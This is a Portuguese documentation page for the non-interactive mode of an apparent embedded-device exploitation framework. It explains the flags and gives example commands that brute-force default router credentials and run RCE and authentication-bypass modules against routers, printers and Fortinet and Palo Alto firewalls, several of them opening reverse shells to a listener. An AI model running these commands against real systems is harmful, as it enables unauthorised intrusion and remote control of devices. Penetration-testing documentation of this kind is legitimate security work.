# Modo Nao-Interativo

**Idioma:** Portugues (pt-BR) | **English (en-US):** [../en-US/04-non-interactive-mode.md](../en-US/04-non-interactive-mode.md)

---

## Visao geral

O modo nao-interativo executa um unico modulo diretamente da linha de comando, sem abrir o shell. Indicado para **automacao**, pipelines de CI, avaliacao em script e execucao unica.

> **Nota:** O modo nao-interativo sempre chama `run()`. Nao chama `check()` primeiro. Para usar `check()`, utilize o shell interativo.

---

## Sintaxe

```bash
embedxpl -m <caminho_modulo> [-s "<opcao> <valor>"] ...
```

Os tres pontos de entrada sao equivalentes:

```bash
embedxpl  -m <caminho> -s "<opt> <val>"   # ponto de entrada pip (recomendado)
exf       -m <caminho> -s "<opt> <val>"   # alias
python -m embedxpl -m <caminho> -s "<opt> <val>"   # invocacao por modulo
python exf.py -m <caminho> -s "<opt> <val>"        # bootstrap legado
```

---

## Flags

| Flag | Forma longa | Tipo | Obrigatorio | Descricao |
|------|-------------|------|-------------|-----------|
| `-h` | `--help` | -- | Nao | Imprime ajuda e sai |
| `-m` | `--module` | `str` (caminho) | Sim* | Caminho do modulo, ex.: `exploits/routers/dlink/dir_300_600_rce` |
| `-s` | `--set` | `str` (`"opcao valor"`) | Nao | Define uma opcao; repita para cada opcao |
| `-T` | `--targets` | `str` (caminho de arquivo) | Nao | Arquivo multi-alvo; cada linha `IP` ou `IP:porta` |
| -- | `--infra` | `str` | Nao | Tipo de infraestrutura: `wizard`, `ot`, personalizado |
| -- | `--context` | `str` | Nao | Contexto para modo infra (ex.: `ics`) |
| -- | `--target` | `str` | Nao | IP/CIDR para plano de scan infra |

\* `-m` obrigatorio exceto com `-T`, `--infra` ou `-h`.

---

## Formato da flag `-s`

Cada `-s` recebe uma **unica string entre aspas** contendo `"opcao valor"`:

```bash
# CORRETO -- uma opcao por flag -s:
embedxpl -m exploits/routers/dlink/dir_300_600_rce \
    -s "target 192.168.0.1" \
    -s "port 80"

# INCORRETO -- nao coloque multiplas opcoes em um -s:
embedxpl -m ... -s "target 192.168.0.1 port 80"   # ERRADO
```

---

## Exemplos

### Teste de credenciais em roteador

```bash
embedxpl -m creds/routers/dlink/telnet_default_creds \
    -s "target 192.168.1.1"
```

Saida esperada:

```text
[*] Executando modulo telnet_default_creds...
[*] Tentando admin:admin em 192.168.1.1:23
[*] Tentando admin:1234 em 192.168.1.1:23
[+] SUCESSO: admin:1234 -- shell obtido
```

### Exploit em roteador

```bash
embedxpl -m exploits/routers/dlink/dir_300_600_rce \
    -s "target 192.168.0.1" \
    -s "port 80"
```

### Exploit em impressora

```bash
embedxpl -m exploits/printers/hp/hp_printing_shellz_rce \
    -s "target 192.168.1.50" \
    -s "port 631" \
    -s "job_type pcl"
```

### Bypass FortiOS com shell reverso

```bash
embedxpl -m exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684 \
    -s "target 10.0.0.5" \
    -s "lhost 10.0.0.99" \
    -s "lport 4444" \
    -s "shell_type python"
```

### Bypass PAN-OS GlobalProtect (CVE-2026-0257)

```bash
embedxpl -m exploits/firewalls/paloalto/globalprotect_auth_bypass_cve_2026_0257 \
    -s "target 203.0.113.10" \
    -s "forge_user admin" \
    -s "lhost 10.0.0.99" \
    -s "lport 4444"
```

### FortiClient EMS + shell reverso forcado

```bash
embedxpl \
    -m exploits/firewalls/fortinet/forticlient_ems_preauth_rce_cve_2026_35616 \
    -s "target 10.0.0.20" \
    -s "lhost 10.0.0.99" \
    -s "lport 9001" \
    -s "shell_type bash" \
    -s "force_exploit true"
```

---

## Modo multi-alvo (`-T`)

```bash
embedxpl -T /tmp/alvos.txt
```

Formato do `alvos.txt`:

```
192.168.1.1
192.168.1.2:8080
10.0.0.0/24
```

Saida esperada:

```text
[*] Scan multi-alvo: 3 entradas
[*] [192.168.1.1] Varrendo...
[+] [192.168.1.1] concluido -- 2 modulos corresponderam
[*] Resumo: 2/3 hosts concluidos.
```

---

## Dicas de automacao

1. **Nao confie no codigo de saida 0** como confirmacao de vulnerabilidade -- apenas indica que o modulo executou sem erro fatal. Analise `stdout` em busca de linhas `[+]`.
2. Redirecione a saida para log: `embedxpl -m ... 2>&1 | tee /tmp/scan.log`
3. Scans paralelos: invoque multiplos processos com arquivos de alvo diferentes.


[Hub da wiki](../README.md)
